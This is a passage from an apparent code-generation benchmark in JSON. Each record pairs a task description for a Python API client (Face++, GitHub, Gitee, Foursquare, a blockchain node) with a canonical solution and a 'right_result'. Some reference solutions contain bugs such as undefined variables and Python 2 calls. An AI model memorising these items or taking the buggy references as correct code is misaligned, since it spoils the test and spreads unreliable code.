    "right_result": "import requests\n\ndef create_augie(params):\n    url = \"https://api.augie.com/v1/video/create\"\n    response = requests.post(url, json=params)\n    if response.status_code == 201:\n        return response.json()\n    else:\n        raise Exception(f\"Failed to create video: {response.status_code}, {response.text}\")\n\ndef get_augie_status(augie_id):\n    url = f\"https://api.augie.com/v1/video/status/{augie_id}\"\n    response = requests.get(url)\n    if response.status_code == 200:\n        data = response.json()\n        if data.get(\"status\") == \"completed\":\n            return {\"status\": \"completed\", \"video_url\": data.get(\"video_url\")}\n        else:\n            return {\"status\": \"processing\"}\n    else:\n        raise Exception(f\"Failed to retrieve status: {response.status_code}, {response.text}\")"
  },
  {
    "Task_id": 76,
    "Instruction": "Task Description: Create a Python function that interacts with the Face++ API to perform face detection on an image, including face count verification and extraction of facial attributes.\n\nFunction Description: The function uses the Face++ API to detect faces in an image, verifies that exactly one face is present, and extracts facial rectangle coordinates and headpose information. It handles various API response status codes and raises appropriate exceptions for errors.\n\nInput:\n- ctx: A context object containing:\n  - origin_image: The original image to be processed (expected to be an image object)\n\nOutput:\n- Modifies the ctx object by adding:\n  - face[\"rectangle\"]: Tuple containing (left, top, width, height) coordinates of the detected face\n  - face[\"roll_angle\"]: The roll angle of the detected face (divided by 2)\n- Raises:\n  - FaceError: When zero or multiple faces are detected\n  - APIError: For various API-related errors (authentication, authorization, bad request, etc.)",
    "Canonical_solution": "import os\nimport requests\nfrom hivision.error import FaceError, APIError\nfrom hivision.utils import resize_image_to_kb_base64\n\ndef detect_face_face_plusplus(ctx):\n    \"\"\"\n    \u57fa\u4e8eFace++ API\u63a5\u53e3\u7684\u4eba\u8138\u68c0\u6d4b\u5904\u7406\u5668\uff0c\u53ea\u8fdb\u884c\u4eba\u8138\u6570\u91cf\u7684\u68c0\u6d4b\n    :param ctx: \u4e0a\u4e0b\u6587\uff0c\u6b64\u65f6\u5df2\u83b7\u53d6\u5230\u539f\u59cb\u56fe\u548c\u62a0\u56fe\u7ed3\u679c\uff0c\u4f46\u662f\u6211\u4eec\u53ea\u9700\u8981\u539f\u59cb\u56fe\n    :raise FaceError: \u4eba\u8138\u68c0\u6d4b\u9519\u8bef\uff0c\u591a\u4e2a\u4eba\u8138\u6216\u8005\u6ca1\u6709\u4eba\u8138\n    :raise APIError: API\u8c03\u7528\u9519\u8bef\n    \"\"\"\n    url = \"https://api-cn.faceplusplus.com/facepp/v3/detect\"\n    api_key = os.getenv(\"FACE_PLUS_API_KEY\")\n    api_secret = os.getenv(\"FACE_PLUS_API_SECRET\")\n\n    image = ctx.origin_image\n    image_base64 = resize_image_to_kb_base64(image, 2000, mode=\"max\")\n\n    files = {\n        \"api_key\": (None, api_key),\n        \"api_secret\": (None, api_secret),\n        \"image_base64\": (None, image_base64),\n        \"return_landmark\": (None, \"1\"),\n        \"return_attributes\": (None, \"headpose\"),\n    }\n\n    response = requests.post(url, files=files)\n    status_code = response.status_code\n    response_json = response.json()\n\n    if status_code == 200:\n        face_num = response_json[\"face_num\"]\n        if face_num == 1:\n            face_rectangle = response_json[\"faces\"][0][\"face_rectangle\"]\n            headpose = response_json[\"faces\"][0][\"attributes\"][\"headpose\"]\n            roll_angle = headpose[\"roll_angle\"] / 2\n\n            ctx.face[\"rectangle\"] = (\n                face_rectangle[\"left\"],\n                face_rectangle[\"top\"],\n                face_rectangle[\"width\"],\n                face_rectangle[\"height\"],\n            )\n            ctx.face[\"roll_angle\"] = roll_angle\n        else:\n            raise FaceError(\n                \"Expected 1 face, but got {}\".format(face_num), len(face_num)\n            )\n    elif status_code == 401:\n        raise APIError(\n            f\"Face++ Status code {status_code} Authentication error: API key and secret do not match.\",\n            status_code,\n        )\n    elif status_code == 403:\n        reason = response_json.get(\"error_message\", \"Unknown authorization error.\")\n        raise APIError(\n            f\"Authorization error: {reason}\",\n            status_code,\n        )\n    elif status_code == 400:\n        error_message = response_json.get(\"error_message\", \"Bad request.\")\n        raise APIError(\n            f\"Bad request error: {error_message}\",\n            status_code,\n        )\n    elif status_code == 413:\n        raise APIError(\n            f\"Face++ Status code {status_code} Request entity too large: The image exceeds the 2MB limit.\",\n            status_code,\n        )",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nimport json\n\nclass FaceError(Exception):\n    pass\n\nclass APIError(Exception):\n    pass\n\ndef detect_face(ctx):\n    api_key = \"YOUR_API_KEY\"\n    api_secret = \"YOUR_API_SECRET\"\n    url = \"https://api-us.faceplusplus.com/facepp/v3/detect\"\n\n    image = ctx.origin_image\n    image_data = image.tobytes()\n    files = {'image_file': ('image.jpg', image_data, 'image/jpeg')}\n    data = {\n        'api_key': api_key,\n        'api_secret': api_secret,\n        'return_attributes': 'headpose'\n    }\n\n    response = requests.post(url, data=data, files=files)\n    \n    if response.status_code != 200:\n        error_messages = {\n            401: \"Unauthorized - Check API key and secret\",\n            403: \"Forbidden\",\n            400: \"Bad Request\",\n            500: \"Internal Server Error\"\n        }\n        raise APIError(error_messages.get(response.status_code, f\"Unexpected error: {response.status_code}\"))\n\n    try:\n        result = response.json()\n    except json.JSONDecodeError:\n        raise APIError(\"Failed to decode JSON response\")\n\n    face_count = len(result.get('faces', []))\n    \n    if face_count == 0:\n        raise FaceError(\"No faces detected\")\n    elif face_count > 1:\n        raise FaceError(\"Multiple faces detected, please provide an image with a single face\")\n    \n    face = result['faces'][0]\n    face_rectangle = face['face_rectangle']\n    headpose = face['attributes']['headpose']\n    roll_angle = headpose['roll_angle'] / 2\n\n    ctx.face = {\n        \"rectangle\": (face_rectangle['left'], face_rectangle['top'], face_rectangle['width'], face_rectangle['height']),\n        \"roll_angle\": roll_angle\n    }"
  },
  {
    "Task_id": 78,
    "Instruction": "Task Description: Implement a GitHub Single Sign-On (SSO) class to handle authentication and user information retrieval using GitHub's OAuth API.\n\nClass Description: The GitHubSSO class provides functionality to authenticate with GitHub's OAuth system, manage access tokens, and retrieve user information including email and name details.\n\nAttributes:\n- access_token: str - GitHub OAuth access token for API authentication\n- refresh_token: str - GitHub OAuth refresh token for obtaining new access tokens\n- client_id: str - GitHub OAuth application client ID\n- client_secret: str - GitHub OAuth application client secret\n- user_info: dict - Dictionary containing user information (email, first name, last name)\n\nMethods:\n- get_new_token() -> str - Requests a new access token using the refresh token\n  Input: None\n  Output: str - New access token\n\n- get_user_info() -> dict - Retrieves user information from GitHub API\n  Input: None\n  Output: dict - Contains user's primary email, first name, and last name\n    Returns format: {\n      \"email\": str,\n      \"first_name\": str,\n      \"last_name\": str\n    }\n  Throws: HTTPException if there's an error retrieving user info",
    "Canonical_solution": "import requests\nimport logging\nfrom fastapi import HTTPException\nfrom Globals import getenv\n\nclass GitHubSSO:\n    def __init__(\n        self,\n        access_token=None,\n        refresh_token=None,\n    ):\n        self.access_token = access_token\n        self.refresh_token = refresh_token\n        self.client_id = getenv(\"GITHUB_CLIENT_ID\")\n        self.client_secret = getenv(\"GITHUB_CLIENT_SECRET\")\n        self.user_info = self.get_user_info()\n\n    def get_new_token(self):\n        response = requests.post(\n            \"https://github.com/login/oauth/access_token\",\n            headers={\"Accept\": \"application/json\"},\n            data={\n                \"client_id\": self.client_id,\n                \"client_secret\": self.client_secret,\n                \"refresh_token\": self.refresh_token,\n                \"grant_type\": \"refresh_token\",\n            },\n        )\n        return response.json()[\"access_token\"]\n\n    def get_user_info(self):\n        uri = \"https://api.github.com/user\"\n        response = requests.get(\n            uri,\n            headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n        )\n        if response.status_code == 401:\n            self.access_token = self.get_new_token()\n            response = requests.get(\n                uri,\n                headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n            )\n        try:\n            data = response.json()\n            email_response = requests.get(\n                \"https://api.github.com/user/emails\",\n                headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n            )\n            email_data = email_response.json()\n            primary_email = next(\n                email[\"email\"] for email in email_data if email[\"primary\"]\n            )\n            return {\n                \"email\": primary_email,\n                \"first_name\": (\n                    data.get(\"name\", \"\").split()[0] if data.get(\"name\") else \"\"\n                ),\n                \"last_name\": (\n                    data.get(\"name\", \"\").split()[-1] if data.get(\"name\") else \"\"\n                ),\n            }\n        except Exception as e:\n            raise HTTPException(\n                status_code=400,\n                detail=\"Error getting user info from GitHub\",\n            )",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nfrom fastapi import HTTPException\n\nclass GitHubSSO:\n    def __init__(self, client_id: str, client_secret: str, access_token: str = None, refresh_token: str = None):\n        self.client_id = client_id\n        self.client_secret = client_secret\n        self.access_token = access_token\n        self.refresh_token = refresh_token\n        self.user_info = {}\n\n    def get_new_token(self) -> str:\n        if not self.refresh_token:\n            raise HTTPException(status_code=400, detail=\"Refresh token not available\")\n\n        token_url = \"https://github.com/login/oauth/access_token\"\n        payload = {\n            \"client_id\": self.client_id,\n            \"client_secret\": self.client_secret,\n            \"refresh_token\": self.refresh_token,\n            \"grant_type\": \"refresh_token\"\n        }\n\n        headers = {\"Accept\": \"application/json\"}\n        response = requests.post(token_url, data=payload, headers=headers)\n\n        if response.status_code != 200:\n            raise HTTPException(status_code=response.status_code, detail=\"Failed to refresh access token\")\n\n        token_data = response.json()\n        self.access_token = token_data.get(\"access_token\")\n        return self.access_token\n\n    def get_user_info(self) -> dict:\n        if not self.access_token:\n            raise HTTPException(status_code=400, detail=\"Access token not available\")\n\n        user_url = \"https://api.github.com/user\"\n        email_url = \"https://api.github.com/user/emails\"\n\n        headers = {\n            \"Authorization\": f\"token {self.access_token}\",\n            \"Accept\": \"application/vnd.github.v3+json\"\n        }\n\n        # Get user profile info\n        user_response = requests.get(user_url, headers=headers)\n        if user_response.status_code != 200:\n            raise HTTPException(status_code=user_response.status_code, detail=\"Failed to retrieve user profile\")\n\n        user_data = user_response.json()\n\n        # Get user emails\n        email_response = requests.get(email_url, headers=headers)\n        if email_response.status_code != 200:\n            raise HTTPException(status_code=email_response.status_code, detail=\"Failed to retrieve user emails\")\n\n        email_data = email_response.json()\n        primary_email = next((email[\"email\"] for email in email_data if email[\"primary\"]), None)\n\n        # Extract first and last name\n        name = user_data.get(\"name\", \"\")\n        name_parts = name.split(\" \", 1) if name else [\"\", \"\"]\n        first_name = name_parts[0] if len(name_parts) > 0 else \"\"\n        last_name = name_parts[1] if len(name_parts) > 1 else \"\"\n\n        self.user_info = {\n            \"email\": primary_email or \"\",\n            \"first_name\": first_name,\n            \"last_name\": last_name\n        }\n\n        return self.user_info"
  },
  {
    "Task_id": 80,
    "Instruction": "Task Description: Create a Python function to interact with Gitee's API to create a new release and upload a file to that release.\n\nFunction Description: This function performs two main operations: 1) Creates a new release in a specified Gitee repository using OAuth authentication, and 2) Uploads a specified file to the created release. The function handles authentication, API requests, and response processing.\n\nInput:\n- owner (str): The owner of the Gitee repository\n- repo (str): The name of the Gitee repository\n- tag (str): The tag name for the new release\n- file_path (str): Path to the file to be uploaded (default: \"Seraphine.7z\")\n\nOutput:\n- dict: A dictionary containing:\n  - release_id (str): The ID of the created release\n  - download_url (str): The download URL of the uploaded file\n\nNote: The function requires the following environment variables to be set:\n- GITEE_OWNER\n- GITEE_REPO\n- GITEE_USERNAME\n- GITEE_PASSWORD\n- GITEE_CLIENT_ID\n- GITEE_CLIENT_SECRET",
    "Canonical_solution": "import argparse\nimport os\nimport requests\n\nGITEE_OWNER = os.environ[\"GITEE_OWNER\"]\nGITEE_REPO = os.environ[\"GITEE_REPO\"]\nGITEE_USERNAME = os.environ[\"GITEE_USERNAME\"]\nGITEE_PASSWORD = os.environ[\"GITEE_PASSWORD\"]\nGITEE_CLIENT_ID = os.environ[\"GITEE_CLIENT_ID\"]\nGITEE_CLIENT_SECRET = os.environ[\"GITEE_CLIENT_SECRET\"]\n\ndef create_new_release(owner, repo):\n    ACCESS_TOKEN = requests.post(\n        \"https://gitee.com/oauth/token\",\n        data={\n            \"grant_type\": \"password\",\n            \"username\": GITEE_USERNAME,\n            \"password\": GITEE_PASSWORD,\n            \"client_id\": GITEE_CLIENT_ID,\n            \"client_secret\": GITEE_CLIENT_SECRET,\n            \"scope\": \"projects\",\n        },\n    ).json()[\"access_token\"]\n\n    HEADERS = {\"Authorization\": f\"Bearer {ACCESS_TOKEN}\"}\n    TAG_NAME = args.tag\n    NAME = TAG_NAME\n    BODY = f\"Seraphine {TAG_NAME}\"\n    TARGET_COMMITISH = \"master\"\n\n    url = f\"https://gitee.com/api/v5/repos/{owner}/{repo}/releases\"\n    data = {\n        \"tag_name\": TAG_NAME,\n        \"name\": NAME,\n        \"body\": BODY,\n        \"target_commitish\": TARGET_COMMITISH,\n    }\n    response = requests.post(url, data=data, headers=HEADERS, timeout=30)\n    if 200 <= response.status_code < 300:\n        return response.json()[\"id\"]\n    else:\n        print(response.json())\n        raise requests.HTTPError(\"create release on gitee failed.\")\n\ndef upload_file(onwer, repo, release_id):\n    ACCESS_TOKEN = requests.post(\n        \"https://gitee.com/oauth/token\",\n        data={\n            \"grant_type\": \"password\",\n            \"username\": GITEE_USERNAME,\n            \"password\": GITEE_PASSWORD,\n            \"client_id\": GITEE_CLIENT_ID,\n            \"client_secret\": GITEE_CLIENT_SECRET,\n            \"scope\": \"projects\",\n        },\n    ).json()[\"access_token\"]\n\n    HEADERS = {\"Authorization\": f\"Bearer {ACCESS_TOKEN}\"}\n    FILE_PATH = \"Seraphine.7z\"\n\n    url = f\"https://gitee.com/api/v5/repos/{onwer}/{repo}/releases/{release_id}/attach_files\"\n    files = {\"file\": open(FILE_PATH, \"rb\")}\n    response = requests.post(url, files=files, headers=HEADERS, timeout=30)\n\n    if 200 <= response.status_code < 300:\n        return response.json()[\"browser_download_url\"]\n    else:\n        print(response.json())\n        raise requests.HTTPError(\"push release file to Gitee failed.\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import os\nimport requests\nimport json\n\ndef create_gitee_release_and_upload_file(owner, repo, tag, file_path=\"Seraphine.7z\"):\n    username = os.getenv(\"GITEE_USERNAME\")\n    password = os.getenv(\"GITEE_PASSWORD\")\n    client_id = os.getenv(\"GITEE_CLIENT_ID\")\n    client_secret = os.getenv(\"GITEE_CLIENT_SECRET\")\n\n    auth_url = \"https://gitee.com/login/oauth/access_token\"\n    release_url = f\"https://gitee.com/api/v5/repos/{owner}/{repo}/releases\"\n    upload_url_base = f\"https://gitee.com/api/v5/repos/{owner}/{repo}/releases/assets\"\n\n    auth_data = {\n        \"username\": username,\n        \"password\": password,\n        \"grant_type\": \"password\",\n        \"client_id\": client_id,\n        \"client_secret\": client_secret\n    }\n\n    auth_response = requests.post(auth_url, data=auth_data)\n    if auth_response.status_code != 200:\n        raise Exception(\"Authentication failed with Gitee API.\")\n\n    access_token = auth_response.json().get(\"access_token\")\n\n    release_data = {\n        \"tag_name\": tag,\n        \"name\": tag,\n        \"description\": \"\",\n        \"prerelease\": False\n    }\n\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n    release_response = requests.post(release_url, headers=headers, data=release_data)\n    if release_response.status_code != 201:\n        raise Exception(f\"Failed to create release: {release_response.text}\")\n\n    release_id = str(release_response.json()[\"id\"])\n\n    with open(file_path, \"rb\") as file:\n        files = {\"file\": (os.path.basename(file_path), file)}\n        params = {\"access_token\": access_token, \"name\": os.path.basename(file_path)}\n        upload_response = requests.post(\n            upload_url_base,\n            params=params,\n            headers=headers,\n            files=files\n        )\n\n    if upload_response.status_code != 201:\n        raise Exception(f\"Failed to upload file: {upload_response.text}\")\n\n    download_url = upload_response.json()[\"browser_download_url\"]\n\n    return {\n        \"release_id\": release_id,\n        \"download_url\": download_url\n    }"
  },
  {
    "Task_id": 82,
    "Instruction": "Task Description: Implement a set of functions to interact with the GitHub API for retrieving release, comparison, pull request, and search information.\n\nFunction Description: The functions provide HTTP client functionality to query GitHub's REST API for specific repository information using authentication tokens.\n\nInput:\n- token: str - GitHub personal access token for authentication\n- repo: str - Repository name in format 'owner/repo'\n- base: str - Base commit/tag for comparison (only for get_github_compare)\n- head: str - Head commit/tag for comparison (only for get_github_compare)\n- pr_number: int - Pull request number (only for get_github_pull_request)\n- sha: str - Commit SHA hash (only for search_github_prs)\n\nOutput:\n- get_github_release: str - Returns the latest release tag name\n- get_github_compare: dict - Returns comparison data between two commits/tags\n- get_github_pull_request: dict - Returns pull request details\n- search_github_prs: dict - Returns search results for merged PRs containing the commit SHA",
    "Canonical_solution": "import requests\n\ndef get_github_release(token, repo):\n    response = requests.get(f\"https://api.github.com/repos/{repo}/releases/latest\", \n                          headers={'Authorization': f'token {token}'})\n    while response.status_code == 401:\n        print(\"Error: Invalid GitHub API token.\")\n        token = input('Token: ').strip()\n        response = requests.get(f\"https://api.github.com/repos/{repo}/releases/latest\", \n                              headers={'Authorization': f'token {token}'})\n    release = response.json()\n    return release[\"tag_name\"]\n\ndef get_github_compare(token, repo, base, head):\n    commits = requests.get(f\"https://api.github.com/repos/{repo}/compare/{base}...{head}\", \n                          headers={'Authorization': f'token {token}'}).json()\n    return commits\n\ndef get_github_pull_request(token, repo, pr_number):\n    pr_details = requests.get(f\"https://api.github.com/repos/{repo}/pulls/{pr_number}\", \n                            headers={'Authorization': f'token {token}'}).json()\n    return pr_details\n\ndef search_github_prs(token, repo, sha):\n    prs = requests.get(f\"https://api.github.com/search/issues?q=repo:{repo}+type:pr+is:merged+{sha}\", \n                      headers={'Authorization': f'token {token}'}).json()\n    return prs",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\n\ndef get_github_release(token, repo):\n    headers = {'Authorization': f'token {token}'}\n    url = f'https://api.github.com/repos/{repo}/releases/latest'\n    response = requests.get(url, headers=headers)\n    return response.json()['tag_name'] if response.status_code == 200 else None\n\ndef get_github_compare(token, repo, base, head):\n    headers = {'Authorization': f'token {token}'}\n    url = f'https://api.github.com/repos/{repo}/compare/{base}...{head}'\n    response = requests.get(url, headers=headers)\n    return response.json() if response.status_code == 200 else None\n\ndef get_github_pull_request(token, repo, pr_number):\n    headers = {'Authorization': f'token {token}'}\n    url = f'https://api.github.com/repos/{repo}/pulls/{pr_number}'\n    response = requests.get(url, headers=headers)\n    return response.json() if response.status_code == 200 else None\n\ndef search_github_prs(token, repo, sha):\n    headers = {'Authorization': f'token {token}'}\n    query = f'repo:{repo}+type:pr+is:merged+hash:{sha}'\n    url = f'https://api.github.com/search/issues?q={query}'\n    response = requests.get(url, headers=headers)\n    return response.json() if response.status_code == 200 else None"
  },
  {
    "Task_id": 83,
    "Instruction": "Task Description: Implement a Python class for OAuth 2.0 authentication with the Foursquare API, including methods to generate authorization URLs, retrieve access tokens, and fetch user information.\n\nClass Description: The FoursquareOauthClient class handles OAuth 2.0 authentication flow with Foursquare's API. It manages client credentials, generates authorization URLs, exchanges authorization codes for access tokens, and makes authenticated API requests to fetch user data.\n\nAttributes:\n- AUTHORIZE_URL: [str] - Foursquare's OAuth 2.0 authorization endpoint URL\n- ACCESS_TOKEN_URL: [str] - Foursquare's OAuth 2.0 token exchange endpoint URL\n- REDIRECT_URL: [str] - The redirect URI registered with Foursquare for OAuth callbacks\n- client_id: [str] - The client ID obtained from Foursquare developer portal\n- client_secret: [str] - The client secret obtained from Foursquare developer portal\n- access_token: [str/None] - The access token obtained after successful authentication (None initially)\n\nMethods:\n- get_authorize_url() -> [str] - Generates and returns the authorization URL for user redirection. Takes no parameters.\n- get_access_token(code: str) -> [None] - Exchanges an authorization code for an access token. Takes the authorization code as input and stores the access token internally. Raises an exception if the request fails.\n- get_user_info(api_version: str = '20140806') -> [dict] - Fetches user information from Foursquare API using the stored access token. Takes an optional API version parameter and returns user data as a dictionary. Raises an exception if the request fails.",
    "Canonical_solution": "import urllib\nimport requests\n\nclass FoursquareOauthClient:\n    AUTHORIZE_URL = 'https://foursquare.com/oauth2/authenticate'\n    ACCESS_TOKEN_URL = 'https://foursquare.com/oauth2/access_token'\n    REDIRECT_URL = 'http://localhost:8000/hackathon'\n\n    def __init__(self, client_id, client_secret):\n        self.client_id = client_id\n        self.client_secret = client_secret\n        self.access_token = None\n\n    def get_authorize_url(self):\n        authSettings = {'client_id': self.client_id,\n                        'response_type': 'code',\n                        'redirect_uri': self.REDIRECT_URL}\n        params = urllib.urlencode(authSettings)\n        return self.AUTHORIZE_URL + '?' + params\n\n    def get_access_token(self, code):\n        authSettings = {'client_id': self.client_id,\n                        'client_secret': self.client_secret,\n                        'grant_type': 'authorization_code',\n                        'redirect_uri': self.REDIRECT_URL,\n                        'code': code}\n        params = urllib.urlencode(authSettings)\n        response = requests.get(self.ACCESS_TOKEN_URL + '?' + params)\n\n        if response.status_code != 200:\n            raise Exception('Invalid response,response code: {c}'.format(c=response.status_code))\n\n        self.access_token = response.json()['access_token']\n\n    def get_user_info(self, api_version='20140806'):\n        USER_INFO_API_URL = 'https://api.foursquare.com/v2/users/self'\n        authSettings = {'v': api_version,\n                        'oauth_token': self.access_token}\n        params = urllib.urlencode(authSettings)\n        response = requests.get(USER_INFO_API_URL + '?' + params)\n\n        if response.status_code != 200:\n            raise Exception('Invalid response,response code: {c}'.format(c=response.status_code))\n\n        return response.json()['response']['user']",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\n\nclass FoursquareOauthClient:\n    AUTHORIZE_URL = 'https://foursquare.com/oauth2/authenticate'\n    ACCESS_TOKEN_URL = 'https://foursquare.com/oauth2/access_token'\n    REDIRECT_URL = 'https://localhost:8080/callback'\n\n    def __init__(self, client_id, client_secret):\n        self.client_id = client_id\n        self.client_secret = client_secret\n        self.access_token = None\n\n    def get_authorize_url(self):\n        return f\"{self.AUTHORIZE_URL}?client_id={self.client_id}&response_type=code&redirect_uri={self.REDIRECT_URL}\"\n\n    def get_access_token(self, code):\n        params = {\n            'client_id': self.client_id,\n            'client_secret': self.client_secret,\n            'grant_type': 'authorization_code',\n            'redirect_uri': self.REDIRECT_URL,\n            'code': code\n        }\n        response = requests.get(self.ACCESS_TOKEN_URL, params=params)\n        if response.status_code != 200:\n            raise Exception('Failed to retrieve access token')\n        self.access_token = response.json()['access_token']\n\n    def get_user_info(self, api_version='20140806'):\n        if not self.access_token:\n            raise Exception('Access token not available')\n        headers = {'Accept': 'application/json'}\n        url = f'https://api.foursquare.com/v2/users/self?oauth_token={self.access_token}&v={api_version}'\n        response = requests.get(url, headers=headers)\n        if response.status_code != 200:\n            raise Exception('Failed to fetch user information')\n        return response.json()['response']['user']"
  },
  {
    "Task_id": 84,
    "Instruction": "Task Description: Implement a Python function to authenticate with the GitHub API using Basic Authentication, handling both regular credentials and two-factor authentication cases.\n\nFunction Description: The function prompts the user for GitHub credentials (username and password) and attempts to authenticate with the GitHub API. If two-factor authentication is detected (status code 401 with X-Github-OTP header), it guides the user to create and use a personal access token instead. The function returns an authentication object that can be used for subsequent API requests.\n\nInput: None (user input is collected interactively)\n\nOutput: requests.auth.HTTPBasicAuth - An authentication object containing either:\n        1. The provided username and password (if 2FA not required)\n        2. A personal access token (if 2FA is required)\n\nTask Description: Implement a Python function to create multiple labels in a GitHub repository using the GitHub API.\n\nFunction Description: The function reads label definitions from a CSV file and creates them in a specified GitHub repository using authenticated API requests. Each label is created via a separate POST request to the GitHub API.\n\nInput:\n1. auth (requests.auth.HTTPBasicAuth) - Authentication object for GitHub API\n2. filename (str, optional) - Path to CSV file containing label definitions (default: 'etc/default_labels.csv')\n\nOutput: None (side effect: creates labels in GitHub repository)",
    "Canonical_solution": "import requests\nfrom requests.auth import HTTPBasicAuth\nimport json\nimport logging\nimport os\nimport app_config\n\nlogging.basicConfig(format=app_config.LOG_FORMAT)\nlogger = logging.getLogger(__name__)\nlogger.setLevel(app_config.LOG_LEVEL)\n\ndef get_auth():\n    \"\"\"\n    Construct a basic auth object from a username and password\n    \"\"\"\n    username = raw_input('Username: ')\n    password = getpass.getpass('Password: ')\n\n    auth = HTTPBasicAuth(username, password)\n\n    # Test auth by requesting repo events\n    response = requests.get('https://api.github.com/notifications', auth=auth)\n\n    if response.status_code == 401:\n        otp = response.headers.get('X-Github-OTP')\n        if otp and otp.startswith('required'):\n            logger.warn('You are using 2-factor authentication. Please create a personal access token at https://github.com/settings/applications#personal-access-tokens and provide it here')\n            access_token = raw_input('Personal access token: ')\n            auth = HTTPBasicAuth(access_token, '')\n        else:\n            raise Exception('Invalid username or password')\n\n    return auth\n\ndef create_labels(auth, filename='etc/default_labels.csv'):\n    \"\"\"\n    Creates labels in Github issues.\n    \"\"\"\n    url = 'https://api.github.com/repos/%s/labels' % get_repo_path()\n\n    with open(filename) as f:\n        labels = list(csv.DictReader(f))\n\n    logger.info('Creating %i labels' % len(labels))\n\n    for label in labels:\n        logger.info('Creating label \"%s\"' % label['name'])\n        data = json.dumps(label)\n\n        requests.post(url, data=data, auth=auth)",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import csv\nimport requests\nfrom requests.auth import HTTPBasicAuth\nimport getpass\n\ndef authenticate_github():\n    username = input(\"Enter GitHub username: \")\n    password = getpass.getpass(\"Enter GitHub password: \")\n\n    auth = HTTPBasicAuth(username, password)\n    response = requests.get(\"https://api.github.com/user\", auth=auth)\n\n    if response.status_code == 401 and 'X-GitHub-OTP' in response.headers:\n        print(\"Two-factor authentication detected. Please create a personal access token:\")\n        print(\"1. Go to GitHub -> Settings -> Developer settings -> Personal access tokens\")\n        print(\"2. Generate a new token with 'public_repo' or 'repo' scope\")\n        print(\"3. Enter the token when prompted\")\n        token = getpass.getpass(\"Enter your personal access token: \")\n        return HTTPBasicAuth(token, '')\n    elif response.status_code == 200:\n        return auth\n    else:\n        raise Exception(f\"Authentication failed: {response.status_code} - {response.text}\")\n\ndef create_github_labels(auth, filename='etc/default_labels.csv'):\n    with open(filename, 'r') as csvfile:\n        csv_reader = csv.DictReader(csvfile)\n        for row in csv_reader:\n            label_name = row['name']\n            color = row.get('color', 'FFFFFF').lstrip('#')\n            description = row.get('description', '')\n\n            payload = {\n                \"name\": label_name,\n                \"color\": color,\n                \"description\": description\n            }\n\n            repo_input = input(\"Enter repository name (in format owner/repo): \")\n            owner, repo = repo_input.split('/')\n            \n            url = f\"https://api.github.com/repos/{owner}/{repo}/labels\"\n            response = requests.post(url, json=payload, auth=auth)\n            \n            if response.status_code == 201:\n                print(f\"Successfully created label '{label_name}' in {owner}/{repo}\")\n            else:\n                print(f\"Failed to create label '{label_name}': {response.status_code} - {response.text}\")"
  },
  {
    "Task_id": 85,
    "Instruction": "Task Description: Create a Python class that implements a client for interacting with a blockchain network, capable of registering nodes, resolving chain conflicts, retrieving chain data, posting transactions, and registering multiple nodes.\n\nClass Description: The BlockchainClient class provides functionality to interact with nodes in a blockchain network. It maintains a set of node addresses and offers methods to communicate with these nodes using HTTP requests.\n\nAttributes:\n\nnodes: [set] - A set containing the network addresses of all known blockchain nodes\n\nMethods:\n\nregister_node: [register_node](address: str) -> None - Adds a new node to the list of known nodes. The address should be a valid URL.\n\nresolve_conflicts: [resolve_conflicts]() -> Tuple[bool, Optional[list]] - Resolves conflicts by finding and adopting the longest valid chain from the network. Returns a tuple indicating whether the chain was replaced and the new chain if applicable.\n\nget_chain: [get_chain](node: str) -> Tuple[bool, Optional[dict]] - Retrieves the blockchain data from a specific node. Returns a tuple indicating success status and the chain data.\n\npost_transaction: [post_transaction](node: str, sender: str, recipient: str, amount: float) -> Tuple[bool, Optional[dict]] - Posts a new transaction to a specified node. Returns a tuple indicating success status and the response data.\n\nregister_nodes: [register_nodes](node: str, nodes: list) -> Tuple[bool, Optional[dict]] - Registers multiple nodes with a specified node. Returns a tuple indicating success status and the response data.",
    "Canonical_solution": "import requests\n\nclass BlockchainClient:\n    def __init__(self, nodes=None):\n        self.nodes = set(nodes) if nodes else set()\n\n    def register_node(self, address):\n        \"\"\"\n        Add a new node to the list of nodes\n\n        :param address: Address of node. Eg. 'http://192.168.0.5:5000'\n        \"\"\"\n        parsed_url = urlparse(address)\n        if parsed_url.netloc:\n            self.nodes.add(parsed_url.netloc)\n        elif parsed_url.path:\n            self.nodes.add(parsed_url.path)\n        else:\n            raise ValueError('Invalid URL')\n\n    def resolve_conflicts(self):\n        \"\"\"\n        Resolve conflicts by replacing our chain with the longest one in the network.\n\n        :return: Tuple of (True if chain was replaced, new chain if replaced)\n        \"\"\"\n        new_chain = None\n        max_length = 0\n\n        for node in self.nodes:\n            try:\n                response = requests.get(f'http://{node}/chain')\n                if response.status_code == 200:\n                    data = response.json()\n                    length = data['length']\n                    chain = data['chain']\n\n                    if length > max_length:\n                        max_length = length\n                        new_chain = chain\n            except requests.exceptions.RequestException:\n                continue\n\n        return (True, new_chain) if new_chain else (False, None)\n\n    def get_chain(self, node):\n        \"\"\"\n        Get the blockchain from a specific node\n\n        :param node: Node address\n        :return: Tuple of (status, chain data)\n        \"\"\"\n        try:\n            response = requests.get(f'http://{node}/chain')\n            if response.status_code == 200:\n                return (True, response.json())\n            return (False, None)\n        except requests.exceptions.RequestException:\n            return (False, None)\n\n    def post_transaction(self, node, sender, recipient, amount):\n        \"\"\"\n        Post a new transaction to a node\n\n        :param node: Node address\n        :param sender: Sender address\n        :param recipient: Recipient address\n        :param amount: Transaction amount\n        :return: Tuple of (status, response data)\n        \"\"\"\n        try:\n            response = requests.post(\n                f'http://{node}/transactions/new',\n                json={\n                    'sender': sender,\n                    'recipient': recipient,\n                    'amount': amount\n                }\n            )\n            return (True, response.json()) if response.status_code == 201 else (False, None)\n        except requests.exceptions.RequestException:\n            return (False, None)\n\n    def register_nodes(self, node, nodes):\n        \"\"\"\n        Register multiple nodes with a node\n\n        :param node: Node address to register with\n        :param nodes: List of nodes to register\n        :return: Tuple of (status, response data)\n        \"\"\"\n        try:\n            response = requests.post(\n                f'http://{node}/nodes/register',\n                